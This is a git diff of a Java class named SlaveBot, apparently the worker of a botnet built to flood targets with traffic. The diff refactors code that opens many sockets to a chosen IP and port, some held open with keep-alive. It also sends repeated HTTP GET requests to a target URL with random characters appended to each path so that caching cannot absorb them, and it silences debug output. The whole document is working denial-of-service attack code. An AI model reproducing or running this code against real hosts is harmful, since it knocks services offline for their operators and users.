@@ -1,4 +1,4 @@
-package bot;
+//package bot;
 
 import java.io.*;
 import java.net.*;
@@ -146,9 +146,11 @@ public class SlaveBot implements Runnable {
 		if (targetDataMap.containsKey(conKey)){
 			try{
 				for(int i = 0; i < numConnectionInt; i++){
-					Socket socObj = new Socket(ip, portInt);
+				InetSocketAddress hostIP = new InetSocketAddress(ip, portInt);
+					Socket socObj = new Socket();
+					socObj.connect(hostIP);
 					obj.arrSoc.add(socObj);
-					System.out.println("Connected to the target");
+				//	System.out.println("Connected to the target");
 				}
 			}
 			catch(Exception e){
@@ -173,12 +175,13 @@ public class SlaveBot implements Runnable {
 				if (targetDataMap.containsKey(conKey)){
 					try{
 						for(int i = 0; i < numConnectionInt; i++){
-							Socket socObj = new Socket(ip, portInt);
-							socObj.setKeepAlive(true);
-							obj.arrSoc.add(socObj);
-							System.out.println("Connected to the target");
+							InetSocketAddress hostIP = new InetSocketAddress(ip, portInt);
+								Socket socObj = new Socket();
+								socObj.connect(hostIP);
+								socObj.setKeepAlive(true);
+								obj.arrSoc.add(socObj);
+								//System.out.println("Connected to the target keepalive");
 						}
-						listMap();
 					}
 					catch(Exception e){
 						System.out.println(e);
@@ -193,35 +196,61 @@ public class SlaveBot implements Runnable {
 				String actualUrl = keepAliveOrUrl.replaceAll("url=", "");
 
 				if(ip.matches(".*\\d+.*")){
-					//System.out.println("The ip has numbers in it ");
 					String halfUrl = ip + ":" + port + actualUrl;
-					String urlToAttack = null;
-					//StringBuilder completeUrl = new StringBuilder(halfUrl);
 					HttpURLConnection connection = null;
 					for(int i = 0; i < numConnectionInt; i++){
+						StringBuilder completeUrl = new StringBuilder(halfUrl);
 						Random random = new Random();
 						char[] chars = "abcdefghijklmnopqrstuvwxyz1234567890".toCharArray();
 						int  randomNum = random.nextInt(10) + 1;
 						for (int j = 0; j < randomNum; j++) {
-							StringBuilder completeUrl = new StringBuilder(halfUrl);
 							char toAppend = chars[random.nextInt(chars.length)];
-							urlToAttack = completeUrl.append(toAppend).toString();
+							completeUrl.append(toAppend).toString();
 						}
-						//System.out.println("The url to connect is " + completeUrl);
+						
 						try{
-							URL url = new URL("http://" + urlToAttack);
-							System.out.println("The url to connect is " + url);
+							URL url = new URL("http://" + completeUrl.toString());
 							connection = (HttpURLConnection) url.openConnection();
 							connection.setRequestMethod("GET");
-							int responseCode = connection.getResponseCode();
-							System.out.println("Response Code : " + responseCode);
+							//System.out.println("The url to connect is " + completeUrl);
+							//int responseCode = connection.getResponseCode();
+							//System.out.println("Response Code : " + responseCode);
 
-							if (connection.getResponseCode() != 200) {
-								throw new RuntimeException("Failed : HTTP error code : "
-										+ connection.getResponseCode());
-							}
-							BufferedReader br = new BufferedReader(new InputStreamReader(
-									(connection.getInputStream())));
+							
+							connection.disconnect();
+
+						} catch (MalformedURLException e) {
+
+							e.printStackTrace();
+
+						} catch (IOException e) {
+
+							e.printStackTrace();
+
+						}
+						
+					}	
+				}
+
+				else{
+					String halfUrl = ip+ actualUrl;
+					HttpURLConnection connection = null;
+					for(int i = 0; i < numConnectionInt; i++){
+						StringBuilder completeUrl = new StringBuilder(halfUrl);
+						Random random = new Random();
+						char[] chars = "abcdefghijklmnopqrstuvwxyz1234567890".toCharArray();
+						int  randomNum = random.nextInt(10) + 1;
+						for (int j = 0; j < randomNum; j++) {
+							char toAppend = chars[random.nextInt(chars.length)];
+							completeUrl.append(toAppend);
+						}
+						try{
+							URL url = new URL("http://" + completeUrl.toString());
+							connection = (HttpURLConnection) url.openConnection();
+							connection.setRequestMethod("GET");
+							//System.out.println("The url to connect is " + url);
+							//int responseCode = connection.getResponseCode();
+							//System.out.println("Response Code : " + responseCode);
 							connection.disconnect();
 
 						} catch (MalformedURLException e) {
@@ -235,55 +264,8 @@ public class SlaveBot implements Runnable {
 						}
 					}
 				}
-
-				else{
-					System.out.println("The ip does not have numbers");
-					String halfUrl = ip+ actualUrl;
-					StringBuilder completeUrl = new StringBuilder(halfUrl);
-					HttpURLConnection connection = null;
-					for(int i = 0; i < numConnectionInt; i++){
-					Random random = new Random();
-					char[] chars = "abcdefghijklmnopqrstuvwxyz1234567890".toCharArray();
-					int  randomNum = random.nextInt(10) + 1;
-					for (int j = 0; j < randomNum; j++) {
-						char toAppend = chars[random.nextInt(chars.length)];
-						completeUrl.append(toAppend);
-					}
-					System.out.println("The url to connect is " + completeUrl);
-					try{
-						URL url = new URL("http://" + completeUrl.toString());
-						connection = (HttpURLConnection) url.openConnection();
-						connection.setRequestMethod("GET");
-						int responseCode = connection.getResponseCode();
-						System.out.println("Response Code : " + responseCode);
-
-						if (connection.getResponseCode() != 200) {
-							throw new RuntimeException("Failed : HTTP error code : "
-									+ connection.getResponseCode());
-						}
-						BufferedReader br = new BufferedReader(new InputStreamReader(
-								(connection.getInputStream())));
-						connection.disconnect();
-
-					} catch (MalformedURLException e) {
-
-						e.printStackTrace();
-
-					} catch (IOException e) {
-
-						e.printStackTrace();
-
-					}
-			
-				}
-
-
 			}
 		}
-		}
-
-
-
 	}
 
 
@@ -301,7 +283,6 @@ public class SlaveBot implements Runnable {
 							deleteSoc.close();
 							entry.getValue().arrSoc.remove(deleteSoc);
 						}
-						listMap();
 					}
 					catch(Exception e){
 						System.exit(-1);
@@ -321,7 +302,6 @@ public class SlaveBot implements Runnable {
 						deleteSoc.close();
 						obj.arrSoc.remove(deleteSoc);
 					}
-					listMap();
 				}
 				catch(Exception e){
 					//System.out.println("Something went wrong");
